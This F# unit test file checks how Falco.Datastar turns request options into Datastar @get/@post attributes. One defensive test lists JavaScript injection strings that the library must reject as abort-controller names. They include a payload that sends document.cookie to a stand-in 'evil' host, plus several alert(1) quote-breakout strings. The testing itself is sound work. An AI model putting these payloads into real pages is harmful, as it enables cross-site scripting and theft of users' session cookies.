namespace Falco.Datastar.Tests

open System
open System.Text.Json
open System.Web
open Falco.Datastar
open FsUnit.Xunit
open Xunit

// The options object that a backend action carries: @post('/x', { ... }). Datastar 1.0.4 reads it as a JavaScript object (createHttpMethod in fetch.ts).
module RequestOptionsTests =
    [<Fact>]
    let ``Ds.post with Form`` () =
        Ds.post ("/channel", { RequestOptions.Defaults with ContentType = Form })
        |> should equal """@post('/channel',{&quot;contentType&quot;:&quot;form&quot;})"""

    [<Fact>]
    let ``Ds.post with SelectedForm`` () =
        Ds.post ("/channel", { RequestOptions.Defaults with ContentType = (SelectedForm "#myForm") })
        |> should equal """@post('/channel',{&quot;contentType&quot;:&quot;form&quot;,&quot;selector&quot;:&quot;#myForm&quot;})"""

    [<Fact>]
    let ``RequestOptions Cleanup is sent as the cleanup request cancellation`` () =
        Ds.get ("/x", { RequestOptions.Defaults with RequestCancellation = Cleanup })
        |> should equal """@get('/x',{&quot;requestCancellation&quot;:&quot;cleanup&quot;})"""

    [<Fact>]
    let ``RequestOptions CustomJson is sent as the payload object`` () =
        Ds.post ("/x", { RequestOptions.Defaults with ContentType = CustomJson {| a = 1 |} })
        |> should equal """@post('/x',{&quot;contentType&quot;:&quot;json&quot;,&quot;payload&quot;:{&quot;a&quot;:1}})"""

    // Retry options: the names are the ones Datastar 1.0.4 reads (createHttpMethod in fetch.ts).
    // RC.8 and earlier read retryMaxWaitMs; since 1.0.0 the name is retryMaxWait.

    [<Fact>]
    let ``RequestOptions RetryMaxWait is sent as retryMaxWait`` () =
        Ds.get ("/x", { RequestOptions.Defaults with RetryMaxWait = System.TimeSpan.FromSeconds 5.0 })
        |> should equal """@get('/x',{&quot;retryMaxWait&quot;:5000})"""

    [<Fact>]
    let ``RequestOptions Retry is sent when it is not the default`` () =
        Ds.get ("/x", { RequestOptions.Defaults with Retry = OnError })
        |> should equal """@get('/x',{&quot;retry&quot;:&quot;error&quot;})"""
        Ds.get ("/x", { RequestOptions.Defaults with Retry = OnAlways })
        |> should equal """@get('/x',{&quot;retry&quot;:&quot;always&quot;})"""
        Ds.get ("/x", { RequestOptions.Defaults with Retry = OnNever })
        |> should equal """@get('/x',{&quot;retry&quot;:&quot;never&quot;})"""

    [<Fact>]
    let ``RequestOptions retry interval, scaler and count keep their names`` () =
        Ds.get ("/x", { RequestOptions.Defaults with RetryInterval = System.TimeSpan.FromMilliseconds 250.0 })
        |> should equal """@get('/x',{&quot;retryInterval&quot;:250})"""
        Ds.get ("/x", { RequestOptions.Defaults with RetryScaler = 3.0 })
        |> should equal """@get('/x',{&quot;retryScaler&quot;:3})"""
        Ds.get ("/x", { RequestOptions.Defaults with RetryMaxCount = 4 })
        |> should equal """@get('/x',{&quot;retryMaxCount&quot;:4})"""

    [<Fact>]
    let ``RequestOptions Defaults write no options, so Datastar's defaults apply`` () =
        Ds.get ("/x", RequestOptions.Defaults)
        |> should equal "@get('/x',{})"

    [<Fact>]
    let ``RequestOptions.Defaults is one shared object, so reading it costs nothing`` () =
        obj.ReferenceEquals(RequestOptions.Defaults, RequestOptions.Defaults) |> should equal true

    [<Fact>]
    let ``RequestOptions OpenWhenHidden is not set by default`` () =
        RequestOptions.Defaults.OpenWhenHidden
        |> should equal (ValueNone : bool voption)

    [<Fact>]
    let ``RequestOptions OpenWhenHidden can be set to false, even for a POST`` () =
        Ds.post ("/x", { RequestOptions.Defaults with OpenWhenHidden = ValueSome false })
        |> should equal """@post('/x',{&quot;openWhenHidden&quot;:false})"""

    [<Fact>]
    let ``RequestOptions OpenWhenHidden true is sent as a JSON boolean`` () =
        Ds.get ("/x", { RequestOptions.Defaults with OpenWhenHidden = ValueSome true })
        |> should equal """@get('/x',{&quot;openWhenHidden&quot;:true})"""

    [<Fact>]
    let ``Ds.query creates a query action`` () =
        Ds.query "/search" |> should equal """@query('/search')"""

    [<Fact>]
    let ``Ds.query takes request options`` () =
        Ds.query ("/search", { RequestOptions.Defaults with RequestCancellation = Disabled })
        |> should equal """@query('/search',{&quot;requestCancellation&quot;:&quot;disabled&quot;})"""

    // filterSignals: Datastar sends the signals that match. A filter that only has an exclude would replace Datastar's own exclude for
    // signals that start with an underscore, which are browser-only, so the underscore rule is kept.

    [<Fact>]
    let ``RequestOptions FilterSignals include is sent as a string pattern`` () =
        Ds.post ("/a", { RequestOptions.Defaults with FilterSignals = SignalsFilter.Include "^foo" })
        |> should equal """@post('/a',{&quot;filterSignals&quot;:{&quot;include&quot;:&quot;^foo&quot;}})"""

    [<Fact>]
    let ``RequestOptions FilterSignals exclude keeps Datastar's rule that underscore signals stay in the browser`` () =
        Ds.post ("/a", { RequestOptions.Defaults with FilterSignals = SignalsFilter.Exclude "secret" })
        |> should equal """@post('/a',{&quot;filterSignals&quot;:{&quot;exclude&quot;:&quot;(^|\\.)_|(?:secret)&quot;}})"""

    [<Fact>]
    let ``RequestOptions FilterSignals sends include and exclude together`` () =
        Ds.post ("/a", { RequestOptions.Defaults with FilterSignals = { SignalsFilter.Prefix "form." with ExcludePattern = ValueSome "\\.id$" } })
        |> should equal """@post('/a',{&quot;filterSignals&quot;:{&quot;include&quot;:&quot;^form\\.&quot;,&quot;exclude&quot;:&quot;(^|\\.)_|(?:\\.id$)&quot;}})"""

    [<Fact>]
    let ``RequestOptions FilterSignals keeps a slash at the edge of a pattern, which Datastar would strip from a string`` () =
        // Datastar removes a leading or trailing slash from a string pattern, as if it were a regular expression literal
        Ds.post ("/a", { RequestOptions.Defaults with FilterSignals = SignalsFilter.Include "/x/" })
        |> should equal """@post('/a',{&quot;filterSignals&quot;:{&quot;include&quot;:&quot;(?:)/x/(?:)&quot;}})"""

    [<Fact>]
    let ``RequestOptions Headers are sent as an object`` () =
        Ds.post ("/a", { RequestOptions.Defaults with Headers = [ "X-A", "1"; "X-B", "two words" ] })
        |> should equal """@post('/a',{&quot;headers&quot;:{&quot;X-A&quot;:&quot;1&quot;,&quot;X-B&quot;:&quot;two words&quot;}})"""

    [<Fact>]
    let ``RequestOptions Headers with a name twice say what to do`` () =
        let error = Assert.Throws<ArgumentException>(fun () -> Ds.post ("/a", { RequestOptions.Defaults with Headers = [ "X-A", "1"; "x-a", "2" ] }) |> ignore)
        error.Message |> should equal """RequestOptions.Headers has the name "x-a" more than once. A request sends each header name once, so put the values in one header, separated by commas."""

    [<Fact>]
    let ``RequestOptions AbortController is sent as the signal name, not as text`` () =
        // Datastar checks that the value is an AbortController, so a string is ignored
        Ds.post ("/a", { RequestOptions.Defaults with RequestCancellation = AbortController "$ctl" })
        |> should equal """@post('/a',{&quot;requestCancellation&quot;:$ctl})"""

    [<Fact>]
    let ``RequestOptions AbortController without a name says what to write`` () =
        let error = Assert.Throws<ArgumentException>(fun () -> Ds.post ("/a", { RequestOptions.Defaults with RequestCancellation = AbortController " " }) |> ignore)
        error.Message |> should equal """RequestOptions.RequestCancellation is AbortController without a name. Write the signal that holds the controller, for example AbortController "$controller", or use Auto."""

    // The AbortController name goes into the page as code, not as text, so anything but a signal reference would run in the browser.
    // A signal reference is one or more dollars, then parts made of letters, digits and underscores, separated by dots.

    [<Fact>]
    let ``RequestOptions AbortController accepts a signal reference`` () =
        for name in [ "$controller"; "$_controller"; "$form.controller"; "$_form._controller" ] do
            Ds.post ("/a", { RequestOptions.Defaults with RequestCancellation = AbortController name })
            |> should equal $"""@post('/a',{{&quot;requestCancellation&quot;:{name}}})"""

    [<Fact>]
    let ``RequestOptions AbortController that is not a signal reference says what to write`` () =
        let notReferences =
            [ // A quote ends the JavaScript, so the rest of it would run as code
              "$ctl'||fetch('//evil/'+document.cookie)||'"
              "$ctl\";alert(1);//"
              "$ctl;alert(1)"
              "$ctl+1"
              // Not a signal at all
              "new AbortController()"
              "controller"
              "$ctl-controller"
              "$1"
              "$ctl['x']"
              "$"
              "$$" ]
        for name in notReferences do
            let error = Assert.Throws<ArgumentException>(fun () -> Ds.post ("/a", { RequestOptions.Defaults with RequestCancellation = AbortController name }) |> ignore)
            error.Message |> should haveSubstring "It is written into the page as code, so it has to be the name of a signal"

    [<Fact>]
    let ``RequestOptions AbortController that has whitespace around it says what to write`` () =
        // A name that is blank says it has no name at all, and one with whitespace only on the ends is refused as a signal reference
        Assert.Throws<ArgumentException>(fun () -> Ds.post ("/a", { RequestOptions.Defaults with RequestCancellation = AbortController " " }) |> ignore)
        |> ignore
        let error = Assert.Throws<ArgumentException>(fun () -> Ds.post ("/a", { RequestOptions.Defaults with RequestCancellation = AbortController "$ctl " }) |> ignore)
        error.Message |> should haveSubstring "It is written into the page as code, so it has to be the name of a signal"

    [<Fact>]
    let ``RequestOptions AbortController does not let a quote out of the attribute`` () =
        // Nothing of the given text reaches the page as code, so there is nothing to break out of
        let options = { RequestOptions.Defaults with RequestCancellation = AbortController "$ctl\";alert(1);//" }
        let error = Assert.Throws<ArgumentException>(fun () -> Ds.post ("/a", options) |> ignore)
        error.Message |> should haveSubstring "It is written into the page as code"

    [<Fact>]
    let ``RequestOptions CustomJson of null sends a JSON null payload`` () =
        // Serializing null gives no node, so the payload is written as null rather than raising NullReferenceException
        Ds.post ("/a", { RequestOptions.Defaults with ContentType = CustomJson null })
        |> should equal """@post('/a',{&quot;contentType&quot;:&quot;json&quot;,&quot;payload&quot;:null})"""

    [<Fact>]
    let ``RequestOptions RetryScaler that is not a number says what to write`` () =
        let error = Assert.Throws<ArgumentException>(fun () -> Ds.get ("/a", { RequestOptions.Defaults with RetryScaler = nan }) |> ignore)
        error.Message |> should equal "RequestOptions.RetryScaler must be a finite number, but it is NaN. Datastar multiplies the wait by it after every retry. Leave it at 2, or use a number such as 1.5."

    [<Fact>]
    let ``RequestOptions with every option set writes them in a fixed order`` () =
        let everything =
            { ContentType = SelectedForm "#f"
              FilterSignals = SignalsFilter.Include "^a"
              Headers = [ "X-A", "1" ]
              OpenWhenHidden = ValueSome true
              Retry = OnError
              RetryInterval = TimeSpan.FromMilliseconds 100.0
              RetryScaler = 3.0
              RetryMaxWait = TimeSpan.FromSeconds 5.0
              RetryMaxCount = 4
              RequestCancellation = Disabled }
        Ds.get ("/a", everything)
        |> should equal """@get('/a',{&quot;contentType&quot;:&quot;form&quot;,&quot;selector&quot;:&quot;#f&quot;,&quot;filterSignals&quot;:{&quot;include&quot;:&quot;^a&quot;},&quot;headers&quot;:{&quot;X-A&quot;:&quot;1&quot;},&quot;openWhenHidden&quot;:true,&quot;retry&quot;:&quot;error&quot;,&quot;retryInterval&quot;:100,&quot;retryScaler&quot;:3,&quot;retryMaxWait&quot;:5000,&quot;retryMaxCount&quot;:4,&quot;requestCancellation&quot;:&quot;disabled&quot;})"""

    [<Fact>]
    let ``Any set of options that has no raw JavaScript in it writes an object that is valid JSON`` () =
        Dst.run "Any set of options" (fun random ->
            let pick (choices: 'a list) = Dst.pick random (Array.ofList choices)
            for _ in 1 .. 20 do
                let options =
                    { ContentType = pick [ Json; Form; SelectedForm "#a b"; CustomJson {| x = "it's <b>\"q\"</b> &" |} ]
                      FilterSignals = pick [ SignalsFilter.None; SignalsFilter.Include "a/b"; SignalsFilter.Exclude "x\"y"; SignalsFilter.Prefix "form." ]
                      Headers = pick [ []; [ "X-A", "it's \"q\"" ]; [ "X-A", "1"; "X-B", "<&>" ] ]
                      OpenWhenHidden = pick [ ValueNone; ValueSome true; ValueSome false ]
                      Retry = pick [ OnAuto; OnError; OnAlways; OnNever ]
                      RetryInterval = pick [ TimeSpan.FromSeconds 1.0; TimeSpan.FromMilliseconds 250.5 ]
                      RetryScaler = pick [ 2.0; 1.5; 3.0 ]
                      RetryMaxWait = pick [ TimeSpan.FromSeconds 30.0; TimeSpan.FromSeconds 5.0 ]
                      RetryMaxCount = pick [ 10; 3 ]
                      RequestCancellation = pick [ Auto; Disabled; Cleanup ] }
                let action = Ds.get ("/x", options)
                // @get('/x',{...}) with the attribute's HTML escaping undone, as the browser sees it
                let decoded = HttpUtility.HtmlDecode(action.Substring(action.IndexOf("',", StringComparison.Ordinal) + 2).TrimEnd ')')
                use parsed = JsonDocument.Parse decoded
                parsed.RootElement.ValueKind |> should equal JsonValueKind.Object)
